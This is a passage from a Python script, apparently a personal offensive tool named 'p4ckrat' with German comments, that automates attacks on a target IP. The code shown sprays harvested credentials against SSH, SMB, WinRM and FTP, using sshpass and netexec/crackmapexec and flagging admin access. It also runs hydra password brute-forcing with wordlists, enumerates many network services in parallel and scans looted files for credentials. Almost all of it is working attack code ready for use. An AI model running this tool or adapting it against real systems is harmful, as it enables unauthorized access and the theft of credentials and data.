    head("CREDENTIAL-SPRAY (PIVOT)")
    info(f"{len(creds)} credential(s) gegen offene Dienste spruehen")
    names = {n for n,_ in svcmap.values()}
    has = lambda port, kw: port in svcmap or any(kw in n for n in names)
    for user, pw, src in creds:
        tag = "spray"
        label = f"{user}:{pw or '<empty>'}"
        # SSH
        if (has("22","ssh")) and have("sshpass"):
            rc, o = run(["sshpass","-p",pw,"ssh","-o","StrictHostKeyChecking=no",
                         "-o","ConnectTimeout=8","-o","PreferredAuthentications=password",
                         f"{user}@{ip}","id"], timeout=30)
            if rc == 0 and "uid=" in (o or ""):
                finding("PIVOT", f"SSH {label} (from {src})", tag)
        # SMB / WinRM via crackmapexec/netexec
        cme = shutil.which("nxc") or shutil.which("netexec") or shutil.which("crackmapexec")
        if cme:
            if has("445","smb") or has("139","smb"):
                _, o = run([cme,"smb",ip,"-u",user,"-p",pw], timeout=40)
                if "[+]" in (o or ""):
                    finding("PIVOT", f"SMB {label} (from {src})", tag)
                    if "(Pwn3d!)" in o: finding("PIVOT", f"SMB ADMIN {label}", tag)
            if has("5985","winrm") or "5985" in svcmap or "5986" in svcmap:
                _, o = run([cme,"winrm",ip,"-u",user,"-p",pw], timeout=40)
                if "[+]" in (o or ""):
                    finding("PIVOT", f"WinRM {label} (from {src})", tag)
        # FTP
        if has("21","ftp"):
            try:
                if not DRY_RUN:
                    ftp = ftplib.FTP(); ftp.connect(ip,21,timeout=10)
                    ftp.login(user, pw); ftp.quit()
                    finding("PIVOT", f"FTP {label} (from {src})", tag)
            except Exception:
                pass

def hydra_prompt(ip, svcmap, out):
    svcs = []
    if "22" in svcmap or any("ssh" in n for n,_ in svcmap.values()): svcs.append(("ssh","22"))
    if "21" in svcmap or any("ftp" in n for n,_ in svcmap.values()): svcs.append(("ftp","21"))
    if not (svcs and have("hydra")):
        if svcs and not have("hydra"): warn("hydra not installed, skipping brute")
        return
    ulist = str(USER_WORDLIST)
    emit()
    if not ask(f"run hydra against {', '.join(s for s,_ in svcs)}? "
               +col("d",f"({Path(ulist).name} x {PASS_WORDLIST.name})"), default="n"):
        info("hydra skipped"); return
    if not (Path(ulist).exists() and PASS_WORDLIST.exists()):
        warn("user/pass list missing"); return
    for name, port in svcs:
        head(f"HYDRA {name}")
        _, o = run_live(["hydra","-L",ulist,"-P",str(PASS_WORDLIST),"-t","4","-f","-I",
                  f"{name}://{ip}"],
                 t="hydra", timeout=T_HYDRA, filt=lambda l: "login:" in l or "valid" in l.lower())
        for m in re.finditer(r"login:\s*(\S+)\s+password:\s*(\S+)", o):
            finding("CREDS", f"{name}  {m.group(1)}:{m.group(2)}", "hydra")
            add_cred(m.group(1), m.group(2), f"hydra/{name}")

def ask(q, default="n"):
    try:
        a = input(col("Y","[?] ")+q+col("d",f" [{'Y/n' if default=='y' else 'y/N'}] ")).strip().lower()
    except EOFError:
        a = ""
    return (a or default) == "y"

def parse_args(argv):
    p = argparse.ArgumentParser(
        prog="p4ckrat", add_help=True,
        description="full-auto recon & loot grabber (by p4cket)")
    p.add_argument("ip", help="Ziel-IP")
    p.add_argument("-d","--domain", default="", help="AD-Domain erzwingen (sonst auto)")
    p.add_argument("--udp", action="store_true", help="parallelen UDP-Top-20-Scan mitlaufen lassen")
    p.add_argument("--nuclei", action="store_true", help="nuclei auf Web-Ports laufen lassen")
    p.add_argument("--no-gobuster", action="store_true", help="gobuster ueberspringen (keine Abfrage)")
    p.add_argument("--no-spray", action="store_true", help="Credential-Spray/Pivot-Phase aus")
    g = p.add_mutually_exclusive_group()
    g.add_argument("-q","--quiet",   action="store_true", help="nur Findings/Warnungen/Fehler")
    g.add_argument("-v","--verbose", action="store_true", help="alle Tool-Zeilen + Kommandos zeigen")
    p.add_argument("--dry-run", action="store_true",
                   help="nur zeigen, welche Kommandos liefen (nichts ausfuehren)")
    return p.parse_args(argv)

def main():
    args = parse_args(sys.argv[1:])
    global DOMAIN, DO_UDP, DO_NUCLEI, DO_SPRAY, VERBOSITY, DRY_RUN, DO_GOBUSTER
    if args.domain: DOMAIN = args.domain
    DO_UDP     = args.udp
    DO_NUCLEI  = args.nuclei
    DO_SPRAY   = not args.no_spray
    DRY_RUN    = args.dry_run
    VERBOSITY  = 0 if args.quiet else (2 if args.verbose else 1)
    ip = args.ip
    out = Path("p4ckrat")          # fester Ordner im aktuellen Verzeichnis
    out.mkdir(parents=True, exist_ok=True)

    logf  = open(out/"p4ckrat.log", "w", encoding="utf-8")
    findf = open(out/"findings.txt", "w", encoding="utf-8")
    findf.write(f"# p4ckrat findings - {ip} - {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
    findf.flush()
    set_logs(logf, findf)

    banner(ip)
    info(f"live findings  -> {out}/findings.txt", None)
    info(f"full log       -> {out}/p4ckrat.log", None)
    if DRY_RUN: warn("DRY-RUN: es wird nichts ausgefuehrt, nur Kommandos gezeigt")
    if not have("nmap"): err("nmap missing, abort"); sys.exit(1)

    svcmap, svc = portscan(ip)
    if not svcmap:
        warn("no open ports, nothing to do"); return
    finding("PORTS", ", ".join(f"{p}/{svcmap[p][0]}" for p in sorted(svcmap, key=int)))
    host = guess_hostname(ip, svc)
    if host:
        finding("HOST", host); add_host(ip, host)

    web_ports = [p for p,(n,_) in svcmap.items()
                 if "http" in n or p in ("80","443","8080","8000","8443","8081")]

    has = lambda port, kw: port in svcmap or any(kw in n for n,_ in svcmap.values())
    if web_ports and not args.no_gobuster:
        DO_GOBUSTER = ask(f"run gobuster (recursive dir fuzz) on port {', '.join(web_ports)}?",
                          default="y")
    else:
        DO_GOBUSTER = False
    if web_ports and not DO_GOBUSTER:
        info("gobuster skipped (nur index/hints)")

    head("ENUM (parallel)")
    db_ports = [(p,k) for p,k in (("1433","mssql"),("3306","mysql"),("5432","postgres")) if p in svcmap]
    workers = list(filter(None,[
        "ftp"      if "21" in svcmap else "",
        "smb"      if ("445" in svcmap or "139" in svcmap) else "",
        *[f"web:{p}" for p in web_ports],
        "kerberos" if "88" in svcmap else "",
        "ldap"     if has("389","ldap") or "636" in svcmap or "3268" in svcmap else "",
        "snmp"     if "161" in svcmap else "",
        "nfs"      if ("2049" in svcmap or "111" in svcmap) else "",
        "rpc"      if "135" in svcmap else "",
        "redis"    if "6379" in svcmap else "",
        "rsync"    if "873" in svcmap else "",
        *[k for _,k in db_ports]]))
    info(f"{CONCURRENCY} workers: "+col("w",", ".join(workers)))
    jobs = []
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
        if "21" in svcmap: jobs.append(ex.submit(ftp_anon, ip, out))
        if "445" in svcmap or "139" in svcmap: jobs.append(ex.submit(smb_anon, ip, out))
        for wp in web_ports: jobs.append(ex.submit(web, ip, wp, out, host))
        if "88" in svcmap: jobs.append(ex.submit(kerberos, ip, out, host))
        if has("389","ldap") or "636" in svcmap or "3268" in svcmap:
            jobs.append(ex.submit(ldap_enum, ip, out, host))
        if "161" in svcmap: jobs.append(ex.submit(snmp_enum, ip, out))
        if "2049" in svcmap or "111" in svcmap: jobs.append(ex.submit(nfs_enum, ip, out))
        if "135" in svcmap: jobs.append(ex.submit(rpc_enum, ip, out))
        if "6379" in svcmap: jobs.append(ex.submit(redis_enum, ip, out))
        if "873" in svcmap: jobs.append(ex.submit(rsync_enum, ip, out))
        for p,k in db_ports: jobs.append(ex.submit(db_probe, ip, p, k, out))
        for f in as_completed(jobs):
            try: f.result()
            except Exception as e: err(f"phase error: {e!r}")

    head("CREDENTIAL-SCAN")
    creds = scan_creds(out/"files")
    if creds:
        warn(f"{len(creds)} moegliche Credential-Treffer in files/")
        for h in creds: finding("CREDS", h[:160])
    else:
        info("keine Credential-Treffer (files/)")

    hydra_prompt(ip, svcmap, out)
    spray_creds(ip, svcmap, out)

    head("DONE")
    ok(f"done in {_el()} -> {col('G',str(out))}/")
    info(col("w",f"{out}/findings.txt")+col("d","  (live findings)"))
    info(col("w",f"{out}/p4ckrat.log")+col("d","  (full log)"))
    if (out/"files").exists():
        info(col("w",f"{out}/files/")+col("d","  (loot)"))
    emit()
    try: logf.close(); findf.close()
    except Exception: pass

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: err("\nabgebrochen.")
